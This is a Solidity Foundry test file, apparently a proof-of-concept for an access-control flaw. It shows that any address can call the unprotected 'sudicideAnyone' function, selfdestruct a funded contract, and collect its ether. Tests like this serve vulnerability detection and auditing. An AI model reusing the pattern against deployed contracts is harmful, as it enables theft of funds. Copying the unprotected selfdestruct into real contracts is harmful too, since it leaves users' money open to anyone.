
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SimpleSuicide} from "../src/SimpleSuicide.sol";

contract TestAccessControlSimpleSuicide is Test {

    SimpleSuicide public _contractUnderTest;

    function setUp() public {
        _contractUnderTest = new SimpleSuicide();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals (Dynamic)
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // No privileged roles exist in this contract - sudicideAnyone has no access control

        // --- 2. State Configuration ---
        
        // Fund the contract to demonstrate value can be stolen via selfdestruct
        vm.deal(address(_contractUnderTest), 1 ether);
        
        // Record caller's balance before the attack
        uint256 callerBalanceBefore = caller.balance;

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // TRIGGER VULNERABILITY
        // Any arbitrary user can call sudicideAnyone and destroy the contract,
        // receiving all the contract's ETH balance
        _contractUnderTest.sudicideAnyone();

        // ASSERT SUCCESS - Verify the caller received the contract's funds
        assertEq(caller.balance, callerBalanceBefore + 1 ether, "Caller should receive contract funds via selfdestruct");
        
        // Verify contract code is destroyed (bytecode size is 0)
        uint256 codeSize;
        address contractAddr = address(_contractUnderTest);
        assembly {
            codeSize := extcodesize(contractAddr)
        }
        assertEq(codeSize, 0, "Contract should be destroyed");
    }
}
